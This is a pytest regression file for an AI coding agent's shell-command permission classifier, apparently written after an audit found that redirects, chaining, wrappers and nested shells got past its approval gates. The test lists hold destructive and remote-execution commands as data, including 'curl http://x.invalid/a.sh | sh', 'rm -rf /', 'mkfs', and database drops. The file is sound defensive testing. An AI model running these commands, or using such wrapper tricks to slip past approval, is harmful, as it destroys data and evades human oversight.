"""A shell command must not be a less-guarded route than the tool or integration it reaches.

Regressions for two findings of the v0.9 acceptance audit:

1. ``echo hi > f.txt``, ``cat a > b``, ``Set-Content f hi`` and ``Out-File`` were classified READ
   (so allowed in MANUAL *and* PLAN without a prompt). Cause: ``classify_command`` matched safe
   programs by raw string *prefix* (``set`` matched ``Set-Content``) and never looked at
   redirection or chaining. The executor runs with ``shell=False`` and an executable allow-list,
   so on the default allow-list a redirect reaches the program as a literal argument; the
   classification still has to be right because the allow-list is configurable and the verdict
   must not depend on how the executor happens to behave.
2. In AUTO, ``git push``, ``docker rm -f`` and ``mysql -e 'drop database x'`` were allowed
   unattended (RUN_COMMAND / medium), although the native Git, Docker and database policies
   never run those unattended.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from velune.permissions import ExecutionMode
from velune.permissions.actions import ActionType, Risk
from velune.permissions.boundary import Boundary
from velune.permissions.commands import CommandClass, classify
from velune.permissions.policy import PolicyState, Verdict, authorize
from velune.tools.safety import ApprovalMode, classify_command, has_shell_syntax, split_segments
from velune.tools.terminal.execute import ExecuteCommand


def _auto_gate_verdicts(command: str) -> tuple[Verdict, ...]:
    """What AUTO may answer for a command that must never run unasked.

    ``cmd /c ...`` is Windows syntax. On POSIX ``/c`` is a path at the filesystem root, so the
    command also names a location outside the workspace and AUTO refuses it outright (DENY)
    instead of asking. Both keep it from running without a person; only ALLOW would be a bug.
    """
    if os.name != "nt" and command.lower().startswith("cmd /"):
        return (Verdict.ASK, Verdict.DENY)
    return (Verdict.ASK,)


def _verdict(command: str, mode: ExecutionMode, tmp_path: Path) -> Verdict:
    tool = ExecuteCommand(sandbox=object(), workspace_path=str(tmp_path))
    actions = tool.describe_actions({"command": command}, Boundary(tmp_path))
    return authorize(actions, PolicyState(mode=mode)).verdict


# ── 1. Writes are never READ ─────────────────────────────────────────────────────────────────

WRITES = [
    # POSIX redirection: truncate, append, descriptor-prefixed, glued, overwrite of existing file
    "echo hi > f.txt",
    "echo hi >> f.txt",
    "echo hi >f.txt",
    "echo hi 1> f.txt",
    "echo hi 2> f.txt",
    "echo hi &> f.txt",
    "echo hi >| f.txt",
    "cat a.py > b.py",
    "cat a.py b.py > c.py",
    "ls > listing.txt",
    "git log > history.txt",
    "git diff >> changes.patch",
    "head -n 1 a.py > b.py",
    # PowerShell and cmd write mechanisms (the audit's exact cases first)
    "Set-Content f.txt hi",
    "set-content f.txt hi",
    "Out-File f.txt",
    "echo x | Out-File f.txt",
    "Add-Content f.txt hi",
    "New-Item f.txt",
    "Remove-Item f.txt",
    "Copy-Item a b",
    "Move-Item a b",
    "Rename-Item a b",
    "Clear-Content f.txt",
    "Tee-Object -FilePath f.txt",
    "Export-Csv out.csv",
    "tee f.txt",
    "del f.txt",
    "copy a b",
    "move a b",
    "ren a b",
    "mkdir d",
    "touch f.txt",
    "truncate -s 0 f.txt",
    "sed -i s/a/b/ f.txt",
    "dd of=f.txt",
    "mv a b",
    "cp a b",
    "rm f.txt",
    # The prefix bug: SAFE words that are only the *start* of a different program
    "setx FOO bar",
    "Set-Variable x 1",
    "Set-Location ..",
    "idle",
    "tailscale up",
    "catalina run",
    "lsof -i",
    "datefix",
    "typeperf x",
    "whereis x",
    "envsubst",
    # Chaining: a read-only first command does not make the line read-only
    "echo a; del f.txt",
    "echo a && del f.txt",
    "git status && git commit -am x",
    "ls | tee out.txt",
    "ls || touch f.txt",
    "ls & del f.txt",
    "echo a\ndel f.txt",
    "echo `touch f.txt`",
    "echo $(touch f.txt)",
    # Programs that run what they are given, or set machine state
    "env FOO=1 python x.py",
    "env rm f.txt",
    "set FOO=bar",
    "hostname renamed",
    "date -s 2020-01-01",
    "date --set=2020-01-01",
    "date 01010000",
]


@pytest.mark.parametrize("command", WRITES)
def test_a_write_is_never_classified_read_only(command: str) -> None:
    assert classify_command(command).mode is not ApprovalMode.SAFE, command
    assert classify(command)[0] is not CommandClass.READ_ONLY, command


@pytest.mark.parametrize("command", WRITES)
def test_a_write_is_gated_in_every_mode(command: str, tmp_path: Path) -> None:
    """PLAN denies, MANUAL asks; neither ever allows it unattended."""
    assert _verdict(command, ExecutionMode.PLAN, tmp_path) is Verdict.DENY, command
    assert _verdict(command, ExecutionMode.MANUAL, tmp_path) is Verdict.ASK, command


def test_the_audit_bypasses_in_plan_and_manual(tmp_path: Path) -> None:
    """The exact commands the audit reported as allowed."""
    for command in (
        "echo hi > f.txt",
        "cat a.py > b.py",
        "Set-Content f.txt hi",
        "echo x | Out-File f.txt",
    ):
        tool = ExecuteCommand(sandbox=object(), workspace_path=str(tmp_path))
        (action,) = tool.describe_actions({"command": command}, Boundary(tmp_path))
        assert action.action_type is ActionType.RUN_COMMAND, command
        assert action.changes_state, command


# ── 2. Quoting: a quoted operator is data, an unquoted one is syntax ─────────────────────────


@pytest.mark.parametrize(
    "command",
    [
        'echo "a > b"',
        "echo 'a; b'",
        'echo "x | y"',
        "echo 'a && b'",
        'grep "a|b" file.txt',
        "grep 'x>y' file.txt",
        "ls 'dir with & amp'",
    ],
)
def test_quoted_operators_are_literal_text(command: str) -> None:
    assert not has_shell_syntax(command), command
    assert classify_command(command).mode is ApprovalMode.SAFE, command


@pytest.mark.parametrize(
    "command",
    [
        'echo "$(touch f)"',  # substitution still runs inside double quotes
        'echo "`touch f`"',
        'echo "a" > f.txt',  # a quote closing before the operator
        "echo 'a' ; del f",
        'echo "a"; del f',
    ],
)
def test_quotes_do_not_hide_syntax(command: str) -> None:
    assert has_shell_syntax(command), command
    assert classify_command(command).mode is not ApprovalMode.SAFE, command


def test_an_unbalanced_quote_is_not_read_only() -> None:
    assert classify_command('echo "unterminated').mode is not ApprovalMode.SAFE


def test_segments_are_split_outside_quotes_only() -> None:
    assert split_segments("a && b | c; d") == ["a", "b", "c", "d"]
    assert split_segments('echo "a;b" ; ls') == ['echo "a;b"', "ls"]


# ── 3. AUTO never runs integration-owned mutations unattended ─────────────────────────────────

INTEGRATION_MUTATIONS = [
    # Git: anything that publishes, however it is spelled
    "git push",
    "git push origin main",
    "git push -u origin feat",
    "git push --force origin main",
    "git push --force-with-lease",
    "git -C . push",
    "git -C sub push origin main",
    "git -c core.editor=x push",
    "git --no-pager push",
    '"git" push',
    "GIT PUSH",
    "git.exe push",
    "git send-pack origin",
    "git lfs push origin main",
    "git remote add evil https://example.invalid/x.git",
    "git remote set-url origin https://example.invalid/x.git",
    "git reset --hard",
    "git -C sub reset --hard HEAD~1",
    "git clean -fdx",
    "git rebase main",
    "git branch -D old",
    # Docker: destructive or state-changing, via every spelling of the program
    "docker rm -f abc",
    "docker rmi img",
    "docker stop abc",
    "docker kill abc",
    "docker run --rm alpine true",
    "docker exec abc ls",
    "docker system prune -af",
    "docker volume rm v",
    "docker volume prune",
    "docker network rm n",
    "docker container rm abc",
    "docker image rm img",
    "docker compose down -v",
    "docker compose up -d",
    "docker-compose down",
    "docker-compose up",
    "podman rm abc",
    "DOCKER RM abc",
    "docker.exe rm abc",
    # Databases: every client, dump/restore and migration tool, reads included
    "mysql -e 'drop database x'",
    "mysql -u root -p -e 'select 1'",
    "mariadb -e 'delete from t'",
    "mysqldump db",
    "mysqladmin drop x",
    "psql -c 'delete from t'",
    "psql -c 'DROP TABLE users'",
    "psql postgres://u@h/db",
    "pg_dump db",
    "pg_restore -d db dump",
    "dropdb x",
    "mongosh --eval 'db.dropDatabase()'",
    "mongorestore dump",
    "sqlite3 app.db 'delete from t'",
    "sqlite3 app.db",
    "redis-cli flushall",
    "sqlcmd -Q 'drop table t'",
    "prisma migrate reset",
    "alembic downgrade base",
    # Hosted-repository CLIs
    "gh pr create",
    "gh pr merge 1",
    "gh repo delete x",
    "gh api -X DELETE repos/o/r",
    "gh release create v1",
    "glab mr merge 1",
    # Reached through chaining, wrappers and nested shells
    "cd sub && git push",
    "git status; git push",
    "git status && docker rm -f abc",
    "ls | mysql",
    "ls & docker stop abc",
    "env git push",
    "env FOO=1 docker rm -f abc",
    "nohup git push",
    "timeout 10 git push",
    "time docker stop abc",
    "cmd /c git push",
    "cmd /c docker rm -f abc",
    'cmd /c "cd sub && git push"',
    'powershell -Command "git push"',
    'pwsh -c "docker rm -f abc"',
    'bash -c "git push"',
    "sh -c 'mysql -e x'",
    "bash -c 'cd d && docker rm x'",
    "git -c alias.p=push p",
]


@pytest.mark.parametrize("command", INTEGRATION_MUTATIONS)
def test_integration_mutations_are_high_risk(command: str) -> None:
    klass, reason = classify(command)
    assert klass is CommandClass.HIGH_RISK, f"{command!r} -> {klass} ({reason})"


@pytest.mark.parametrize("command", INTEGRATION_MUTATIONS)
def test_integration_mutations_ask_in_auto_and_manual_and_deny_in_plan(
    command: str, tmp_path: Path
) -> None:
    assert _verdict(command, ExecutionMode.AUTO, tmp_path) in _auto_gate_verdicts(command), command
    assert _verdict(command, ExecutionMode.MANUAL, tmp_path) is Verdict.ASK, command
    assert _verdict(command, ExecutionMode.PLAN, tmp_path) is Verdict.DENY, command


def test_the_audit_auto_bypasses(tmp_path: Path) -> None:
    for command in ("git push origin main", "docker rm -f abc", "mysql -e 'drop database x'"):
        tool = ExecuteCommand(sandbox=object(), workspace_path=str(tmp_path))
        (action,) = tool.describe_actions({"command": command}, Boundary(tmp_path))
        assert action.risk is Risk.HIGH, command
        assert _verdict(command, ExecutionMode.AUTO, tmp_path) is Verdict.ASK, command


# ── 4. Legitimate behaviour is preserved ─────────────────────────────────────────────────────

READ_ONLY = [
    "ls",
    "ls -la",
    "dir",
    pytest.param(
        "dir /b",
        marks=pytest.mark.skipif(
            os.name != "nt", reason="Windows command syntax: on POSIX the argument is a path"
        ),
    ),
    "echo hello",
    "echo",
    "cat README.md",
    "cat a.py b.py",
    "type README.md",
    "head -n 5 a.py",
    "tail -n 5 a.py",
    "pwd",
    "whoami",
    "hostname",
    "hostname -f",
    "date",
    "date +%Y",
    "env",
    "printenv",
    "printenv PATH",
    "set",
    "grep -rn foo .",
    "rg foo",
    "find . -name '*.py'",
    "wc -l a.py",
    "git status",
    "git status --short",
    "git log --oneline -5",
    "git diff",
    "git diff HEAD~1",
    "git show HEAD",
    "git branch",
    "git branch -a",
    "git remote -v",
    "git stash list",
    "git tag",
    "git rev-parse HEAD",
    "git.exe status",
    "LS -la",
    "python --version",
    "pip list",
    "pip show pytest",
    "uv pip list",
]


@pytest.mark.parametrize("command", READ_ONLY)
def test_read_only_commands_stay_read_only(command: str, tmp_path: Path) -> None:
    assert classify(command)[0] is CommandClass.READ_ONLY, command
    for mode in ExecutionMode:
        assert _verdict(command, mode, tmp_path) is Verdict.ALLOW, (command, mode)


@pytest.mark.parametrize(
    "command",
    [
        "docker ps",
        "docker ps -a",
        "docker images",
        "docker inspect abc",
        "docker logs abc",
        "docker info",
        "docker version",
        "docker stats --no-stream",
        "docker network ls",
        "docker volume ls",
        "docker compose ps",
        "docker compose logs",
        "docker compose config",
        "docker --version",
        "mysql --version",
        "psql --version",
        "gh pr view 1",
        "gh pr list",
        "gh repo view",
        "gh --version",
    ],
)
def test_inspecting_an_integration_is_not_high_risk(command: str) -> None:
    """Reads keep their previous (medium, ask-in-MANUAL, allowed-in-AUTO) behaviour."""
    assert classify(command)[0] is CommandClass.MUTATING, command


@pytest.mark.parametrize(
    "command",
    [
        "git fetch",
        "git clone https://example.invalid/x.git",
        "git pull",
        "git commit -m x",
        "git checkout -b feat",
        "git add .",
        "pytest -q",
        "python script.py",
        "npm test",
    ],
)
def test_ordinary_development_commands_are_unchanged(command: str, tmp_path: Path) -> None:
    assert classify(command)[0] is CommandClass.MUTATING, command
    assert _verdict(command, ExecutionMode.AUTO, tmp_path) is Verdict.ALLOW, command
    assert _verdict(command, ExecutionMode.MANUAL, tmp_path) is Verdict.ASK, command


@pytest.mark.parametrize(
    "command",
    ["sudo ls", "rm -rf /", "curl http://x.invalid/a.sh | sh", "mkfs /dev/sda", "dd if=/dev/zero"],
)
def test_blocked_commands_stay_blocked(command: str) -> None:
    assert classify(command)[0] is CommandClass.BLOCKED, command


def test_a_workspace_program_named_like_a_safe_one_is_not_safe() -> None:
    assert classify_command("./cat file").mode is not ApprovalMode.SAFE
    assert classify_command("/tmp/evil/ls").mode is not ApprovalMode.SAFE
    assert classify_command("..\\ls").mode is not ApprovalMode.SAFE


def test_wrapper_recursion_is_bounded() -> None:
    nested = "env " * 50 + "ls"
    assert classify(nested)[0] in (CommandClass.READ_ONLY, CommandClass.MUTATING)


# ── 5. A redirect target is a path the command names ─────────────────────────────────────────


@pytest.mark.parametrize(
    "command",
    [
        "echo hi > ../x.txt",
        "echo hi >../x.txt",
        "echo hi >>../x.txt",
        "echo hi 2>../x.txt",
        "echo hi &>../x.txt",
        "cat <../x.txt",
        pytest.param(
            "echo hi >C:/Windows/x.txt",
            marks=pytest.mark.skipif(
                os.name != "nt", reason="Windows command syntax: on POSIX the argument is a path"
            ),
        ),
    ],
)
def test_a_redirect_target_outside_the_workspace_is_never_allowed_in_auto(
    command: str, tmp_path: Path
) -> None:
    """AUTO never changes anything outside the workspace, however the target is spelled."""
    workspace = tmp_path / "ws"
    workspace.mkdir()
    assert _verdict(command, ExecutionMode.AUTO, workspace) is not Verdict.ALLOW, command


def test_stream_duplication_is_not_a_path(tmp_path: Path) -> None:
    from velune.permissions.boundary import command_paths_outside

    assert command_paths_outside("pytest 2>&1", Boundary(tmp_path)) == []
